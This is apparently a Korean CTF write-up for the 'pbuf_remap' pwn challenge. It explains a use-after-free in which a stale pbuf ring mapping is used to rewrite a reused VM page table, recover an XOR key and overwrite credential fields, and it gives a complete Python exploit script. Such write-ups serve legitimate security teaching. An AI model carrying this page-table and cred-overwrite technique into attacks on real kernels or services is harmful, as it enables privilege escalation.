# pbuf_remap

## 문제 설명

- 제공 파일: `pbuf_remap`, `Dockerfile`, `flag.txt`
- 서버: `nc pwn.v1t.site 31337`
- 백업 서버: `nc chall.v1t.site 31337`

## 풀이

### 분석

프로그램은 다음과 같은 메뉴를 제공한다.

```text
1. IORING_REGISTER_PBUF_RING
2. mmap pbuf ring
3. IORING_UNREGISTER_PBUF_RING
4. io_uring_buf_ring_add
5. inspect mapped ring entry
6. create mm context
7. vm alloc user page
8. vm read
9. vm write
10. open flag
```

내부에는 512개의 4KB 물리 페이지와 간단한 페이지 할당기가 구현되어 있다. 프로그램 시작 시 중요한 페이지의 배치는 다음과 같이 결정된다.

| PFN | 용도 |
|---:|---|
| 0 | boot log |
| 1 | 권한 정보를 담는 `cred` 페이지 |
| 2 | 이후 할당되는 pbuf ring 페이지 |
| 3 | VM 생성 시 사용하는 scratch 페이지 |

`cred` 페이지는 대략 다음과 같은 구조를 갖는다.

```text
offset 0x00: "CREDv1"
offset 0x08: uid/gid 관련 값
offset 0x10: 권한 관련 값
offset 0x18: privileged sentinel
offset 0x20: 무결성 검사용 해시
```

10번 메뉴는 다음 조건을 모두 만족할 때만 플래그 파일을 연다.

```text
cred + 0x00 == "CREDv1"
cred + 0x08 == 0
cred + 0x10 == 0
cred + 0x18 == 0xffffffffffffffff
cred + 0x20 == 초기 무결성 해시
```

따라서 `cred`의 서명과 해시는 보존하면서 `0x08`, `0x10`, `0x18`만 수정하면 된다.

### 취약점

핵심 취약점은 pbuf ring을 `mmap`한 뒤 unregister할 때 발생하는 use-after-free이다.

1. pbuf ring을 등록하면 프로그램이 물리 페이지를 할당한다.
2. `mmap pbuf ring`을 실행하면 별도의 mapping 구조체가 해당 PFN을 기억한다.
3. `IORING_UNREGISTER_PBUF_RING`은 pbuf backing page를 할당자에 반환한다.
4. 그러나 기존 mapping 구조체는 제거하거나 무효화하지 않는다.
5. 이후에도 4번과 5번 메뉴를 통해 해제된 물리 페이지를 읽고 쓸 수 있다.

즉, pbuf 페이지가 다른 객체로 재할당되면 stale mapping을 이용해 새 객체를 조작할 수 있다.

256개의 pbuf entry를 등록하면 정확히 한 페이지가 필요하다.

```text
256 entries × 16 bytes = 4096 bytes
```

할당 순서는 결정적이므로 pbuf ring은 PFN 2를 받는다. 이 페이지를 매핑한 뒤 해제하고 VM을 생성하면 다음과 같이 재사용된다.

```text
pbuf PFN 2 해제
        ↓
VM page table이 PFN 2 재사용
VM scratch page는 PFN 3 사용
```

결과적으로 stale pbuf mapping을 통해 VM의 페이지 테이블을 직접 읽고 쓸 수 있다.

페이지 테이블 엔트리는 다음 방식으로 XOR 인코딩되어 있다.

```text
encoded_pte = real_pte ^ vm_key
real_pte    = (PFN << 12) | flags
```

VM 생성 시 7번 PTE는 scratch page인 PFN 3을 권한 비트 `7`로 매핑한다.

```text
real_pte_7 = (3 << 12) | 7 = 0x3007
```

pbuf entry 하나는 16바이트이므로 ring entry 3은 페이지 테이블의 PTE 6과 PTE 7을 동시에 덮는다.

```text
ring entry 3: offset 0x30 ~ 0x3f
PTE 6:       offset 0x30 ~ 0x37
PTE 7:       offset 0x38 ~ 0x3f
```

5번 메뉴의 출력에서 두 번째 qword인 PTE 7은 `len`, `bid`, `resv`로 나뉘어 표시된다.

```python
encoded_slot7 = length | (bid << 32) | (resv << 48)
vm_key = encoded_slot7 ^ 0x3007
```

이 키를 구하면 PTE 0을 `cred` 페이지인 PFN 1로 연결하는 값을 만들 수 있다.

```python
encoded_cred_pte = vm_key ^ 0x1007
```

### 익스플로잇

공격 과정은 다음과 같다.

1. `entries=256`으로 pbuf ring을 등록해 PFN 2를 할당받는다.
2. pbuf ring을 mmap해 mapping 0을 만든다.
3. ring을 unregister해 PFN 2를 해제한다.
4. VM을 생성해 PFN 2를 페이지 테이블로 재사용시킨다.
5. stale mapping의 entry 3을 읽어 PTE 7과 `vm_key`를 복구한다.
6. stale mapping의 entry 0에 `cred` PFN 1을 가리키는 PTE를 쓴다.
7. VM 0의 가상 주소 0이 `cred` 페이지를 가리키게 된다.
8. VM write로 `cred+0x08`부터 16바이트를 0으로 만든다.
9. `cred+0x18`부터 8바이트를 `0xff`로 만든다.
10. 10번 메뉴를 실행해 `/flag`를 읽는다.

원격 서버는 `redpwnpow` Proof-of-Work를 사용하므로 서버가 전달한 challenge를 공식 solver로 풀어 전송했다.

```python
#!/usr/bin/env python3
import re
import socket
import subprocess
import sys
from pathlib import Path


HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31337


class Tube:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=30)
        self.buffer = b""
        greeting, marker = self.recvuntil_any((b"solution: ", b"> "))

        if marker == b"solution: ":
            challenge = re.search(rb"sh -s ([^\r\n ]+)", greeting)
            if not challenge:
                raise RuntimeError(f"unexpected proof of work: {greeting!r}")

            solver = Path(__file__).with_name("redpwnpow.exe")
            solution = subprocess.check_output(
                [solver, challenge.group(1).decode()],
                text=True,
            ).strip()
            self.sendline(solution)
        else:
            self.buffer = marker + self.buffer

    def recvuntil_any(self, markers):
        while not any(marker in self.buffer for marker in markers):
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(self.buffer.decode(errors="replace"))
            self.buffer += chunk

        marker = min(
            (marker for marker in markers if marker in self.buffer),
            key=self.buffer.index,
        )
        end = self.buffer.index(marker) + len(marker)
        result, self.buffer = self.buffer[:end], self.buffer[end:]
        return result, marker

    def recvuntil(self, marker):
        while marker not in self.buffer:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(self.buffer.decode(errors="replace"))
            self.buffer += chunk

        end = self.buffer.index(marker) + len(marker)
        result, self.buffer = self.buffer[:end], self.buffer[end:]
        return result

    def sendline(self, value):
        if isinstance(value, int):
            value = str(value)
        if isinstance(value, str):
            value = value.encode()
        self.sock.sendall(value + b"\n")

    def choose(self, number):
        self.recvuntil(b"> ")
        self.sendline(number)

    def answer(self, prompt, value):
        self.recvuntil(prompt)
        self.sendline(value)


io = Tube(HOST, PORT)

# PFN 2에 한 페이지 크기의 pbuf ring을 할당한다.
io.choose(1)
io.answer(b"bgid: ", 1)
io.answer(b"entries: ", 256)
io.answer(b"flags: ", 1)

# mapping 0이 PFN 2를 기억하게 한다.
io.choose(2)
io.answer(b"bgid: ", 1)

# backing page만 해제되고 mapping 0은 남는다.
io.choose(3)
io.answer(b"bgid: ", 1)

# 해제된 PFN 2가 VM 0의 page table로 재사용된다.
io.choose(6)

# ring entry 3에서 PTE 7을 누출하고 XOR 키를 계산한다.
io.choose(5)
io.answer(b"map: ", 0)
io.answer(b"idx: ", 3)
leak = io.recvuntil(b"\n")

match = re.search(
    rb"addr=0x([0-9a-f]+) len=0x([0-9a-f]+) "
    rb"bid=0x([0-9a-f]+) resv=0x([0-9a-f]+)",
    leak,
)
if not match:
    raise RuntimeError(f"unexpected leak: {leak!r}")

_, length, bid, resv = (int(value, 16) for value in match.groups())
encoded_slot7 = length | (bid << 32) | (resv << 48)
vm_key = encoded_slot7 ^ 0x3007

# PTE 0을 cred 페이지(PFN 1)의 writable mapping으로 바꾼다.
encoded_cred_pte = vm_key ^ 0x1007
io.choose(4)
io.answer(b"map: ", 0)
io.answer(b"idx: ", 0)
io.answer(b"addr: ", encoded_cred_pte)
io.answer(b"len: ", 0)
io.answer(b"bid: ", 0)
io.answer(b"resv: ", 0)

# cred+0x08과 cred+0x10을 0으로 만든다.
io.choose(9)
io.answer(b"vm: ", 0)
io.answer(b"va: ", 8)
io.answer(b"len: ", 16)
io.answer(b"hex: ", b"00" * 16)

# cred+0x18의 privileged sentinel을 -1로 만든다.
io.choose(9)
io.answer(b"vm: ", 0)
io.answer(b"va: ", 24)
io.answer(b"len: ", 8)
io.answer(b"hex: ", b"ff" * 8)

# 권한 검사를 통과하고 플래그를 출력한다.
io.choose(10)
result = io.recvuntil(b"> ")
flag = re.search(rb"[A-Za-z0-9_]+\{[^}\r\n]+\}", result)
if not flag:
    raise RuntimeError(result.decode(errors="replace"))

print(flag.group().decode())
```

## 배운 점

- backing page의 수명과 userspace mapping의 수명이 일치하지 않으면 해제 후 사용 취약점으로 이어질 수 있다.
- stale mapping은 단순한 데이터 변조를 넘어, 재할당된 페이지 테이블과 같은 중요한 구조체를 공격하는 프리미티브가 될 수 있다.
- XOR로 PTE를 난독화하더라도 평문이 알려진 엔트리가 하나 있으면 키를 복구할 수 있다.
